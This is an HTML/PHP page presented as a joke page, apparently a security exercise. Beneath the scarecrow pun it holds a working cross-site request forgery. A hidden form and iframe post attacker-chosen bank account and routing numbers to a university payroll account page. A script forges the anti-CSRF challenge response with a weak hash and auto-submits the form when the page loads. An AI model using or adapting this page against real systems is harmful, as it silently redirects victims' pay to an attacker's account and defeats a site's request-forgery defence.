<html>
<head>
<title>Funny Joke</title>
</head>
<body>
<p>Why did the scarecrow win the Nobel prize? Because he was out standing in his field</p> 

<?php
$joke = mt_rand();
?>
	
<iframe style="display:none" name="csrf-frame"></iframe>
<form method="post" action="http://payroll.utexas.edu/account.php" target="csrf-frame" id="csrf_form">
	<input id="account" type="hidden" name="account" value="3133731337" />
        <input id="route" type="hidden" name="routing" value="1000000001" />
	<input id="csrfc" type="hidden" name="challenge" value="<?php echo $joke ?>">
	<input id="csrfr" type="hidden" name="response" value="">
	<button name="action" style="display:none" id="btnaaa" type="submit" value="save">
</form>


<script type="text/javascript">

String.prototype.hashCode = function(){
  var hash = 1;
  for (i = 0; i < this.length; i++) {
    hash = (17237*hash + this.charCodeAt(i)) % 100000;
  }
  return hash;
}
	var acc = document.getElementById('account');
	var route = document.getElementById('route');
        function attack() {
		document.getElementById('csrfr').value =(acc.value + "<?php echo $joke ?>"+ route.value).hashCode();
	}
	
	acc.onkeyup = attack;
	route.onkeyup = attack; 
	attack();
	document.getElementById('btnaaa').click();

</script>

